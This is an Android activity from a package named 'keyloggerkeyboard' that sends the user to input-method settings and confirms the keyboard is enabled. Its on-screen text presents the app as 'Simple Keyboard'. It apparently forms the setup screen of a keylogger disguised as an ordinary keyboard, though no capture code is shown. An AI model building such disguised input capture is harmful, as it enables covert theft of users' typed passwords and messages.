package com.example.keyloggerkeyboard;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class EnableKeyboardActivity extends AppCompatActivity {
    
    private TextView statusText;
    private Button btnSettings;
    private Button btnCheck;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_enable);
        
        statusText = findViewById(R.id.status_text);
        btnSettings = findViewById(R.id.btn_settings);
        btnCheck = findViewById(R.id.btn_check);
        
        // Check initial status
        checkKeyboardEnabled();
        
        // Go to Settings button
        btnSettings.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                openKeyboardSettings();
            }
        });
        
        // Check status button
        btnCheck.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                checkKeyboardEnabled();
            }
        });
    }
    
    private void openKeyboardSettings() {
        Intent intent = new Intent(Settings.ACTION_INPUT_METHOD_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
    private void checkKeyboardEnabled() {
        String enabledKeyboards = Settings.Secure.getString(
            getContentResolver(),
            Settings.Secure.ENABLED_INPUT_METHODS
        );
        
        String packageName = getPackageName();
        boolean isEnabled = enabledKeyboards != null && enabledKeyboards.contains(packageName);
        
        if (isEnabled) {
            statusText.setText("✅ Keyboard is enabled and ready to use!");
            statusText.setTextColor(getResources().getColor(R.color.success));
        } else {
            statusText.setText("⚠️ Please enable Simple Keyboard in Settings");
            statusText.setTextColor(getResources().getColor(R.color.warning));
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // Check status when returning from Settings
        checkKeyboardEnabled();
    }
}